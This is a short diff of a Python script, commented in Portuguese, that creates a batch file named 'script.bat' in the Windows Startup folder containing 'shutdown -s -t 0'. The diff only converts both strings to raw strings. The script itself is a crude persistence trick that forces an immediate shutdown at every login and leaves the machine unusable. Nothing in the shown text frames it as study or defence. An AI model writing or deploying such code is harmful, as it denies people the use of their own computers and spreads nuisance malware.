@@ -1,9 +1,9 @@
 import os
 
 # creating variables to inform the program the directory and the script content
-diretorio = 'C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+diretorio = r'C:\Users\%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
 
-scriptbat = 'shutdown -s -t 0'
+scriptbat = r'shutdown -s -t 0'
 
 # creating the BATCH file on the path
 caminho_batch = os.path.join(diretorio, "script.bat")
